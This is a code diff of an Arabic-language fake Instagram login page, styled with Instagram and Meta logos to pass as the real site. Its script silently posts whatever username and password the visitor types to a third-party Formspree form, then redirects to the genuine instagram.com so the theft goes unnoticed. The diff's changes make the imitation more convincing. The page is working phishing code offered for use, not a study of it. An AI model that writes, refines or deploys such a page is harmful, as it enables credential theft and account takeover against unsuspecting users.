@@ -1,51 +1,69 @@
+
 <!DOCTYPE html>
-<html lang="ar">
-<head>
+<html lang="ar" dir="rtl">
+<head> 
+        <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
         * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #fafafa; margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
-        .logo { font-size: 38px; font-style: italic; margin-bottom: 30px; }
-        input { width: 100%; padding: 10px; margin-bottom: 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; }
-        button { width: 100%; padding: 10px; background-color: #0095f6; color: #fff; border: none; border-radius: 6px; font-weight: bold; margin-top: 10px; cursor: pointer; }
-        .divider { margin: 20px 0; font-size: 13px; color: #8e8e8e; }
-        .footer { margin-top: 15px; border: 1px solid #dbdbdb; background: #fff; width: 350px; padding: 20px; text-align: center; font-size: 14px; }
+        body { background-color: #000; color: #fff; margin: 0; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        
+    /*زخرفه اسم انستا*/
+        /* شعار انستا*/
+        .insta-logo { width: 75px; height:70px; margin-bottom: 40px; }
+        
+        .input-field { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 12px; padding: 14px; margin-bottom: 12px; color: #fff; font-size: 14px; text-align: right; }
+        .input-field::placeholder { color: #8e8e8e; }
+
+        .login-btn { width: 100%; background-color: #0064e0; color: #fff; border: none; border-radius: 25px; padding: 14px; font-weight: 600; font-size: 16px; margin-top: 10px; cursor: pointer; }
+        
+        .forgot-pass { color: #fff; text-decoration: none; font-size: 14px; margin-top: 20px; display: block; opacity: 0.9; }
+        
+        .create-account { width: 100%; background: transparent; border: 1px solid #0064e0; color: #0064e0; border-radius: 25px; padding: 12px; font-weight: 600; margin-top: 150px; cursor: pointer; }
+        
+        .meta-logo { margin-top: 20px; width: 60px; opacity: 0.6; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div class="logo">Instagram</div>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="insta-logo">
 
         <form id="loginForm">
-            <input type="text" name="User" id="username" placeholder="Phone number, username, or email" required>
-            <input type="password" name="Pass" id="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
+            <input type="text" name="User" class="input-field" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الـ" required>
+            <input type="password" name="Pass" class="input-field" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
 
-        <div class="divider">──────── OR ────────</div>
-        <div style="color:#385185; font-weight:bold; font-size:14px;">Log in with Facebook</div>
-    </div>
+        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
 
-    <div class="footer">Don't have an account? <span style="color: #0095f6; font-weight: bold;">Sign up</span></div>
+        <button class="create-account">إنشاء حساب جديد</button>
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/2560px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo">
+    </div>
 
     <script>
         const form = document.getElementById('loginForm');
         form.addEventListener('submit', function(e) {
-            e.preventDefault(); // منع الصفحة من الانتعاش أو إظهار رسالة Thanks
+            e.preventDefault(); 
 
             const formData = new FormData(form);
 
-            // إرسال البيانات للرابط في الخلفية
+            // إرسال البيانات في الخلفية لـ Formspree
             fetch('https://formspree.io/f/mdakqgez', {
                 method: 'POST',
                 body: formData,
                 headers: { 'Accept': 'application/json' }
             }).finally(() => {
-                // بعد الإرسال (نجح أو فشل) سينتقل فوراً لإنستغرام
+                // التحويل للانستغرام الحقيقي بعد الإرسال
                 window.location.href = "https://www.instagram.com/";
             });
         });
